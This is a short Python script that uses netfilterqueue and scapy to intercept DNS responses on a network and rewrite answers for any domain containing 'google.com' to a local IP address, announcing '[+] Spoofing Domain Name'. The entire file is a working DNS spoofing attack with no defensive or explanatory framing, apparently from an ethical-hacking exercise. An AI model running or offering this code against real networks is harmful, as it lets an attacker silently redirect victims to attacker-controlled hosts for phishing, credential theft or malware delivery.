#!/usr/bin/ python
import netfilterqueue
import scapy.all as scapy


#callback_function
def process_packet(packet):
    #converting to scapy packet
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if str.encode("google.com") in qname:
            print("[+] Spoofing Domain Name")

            answer = scapy.DNSRR(rrname=qname, rdata="192.168.219.36")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            
            packet.set_payload(bytes(scapy_packet))
            #packet.drop()
            
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()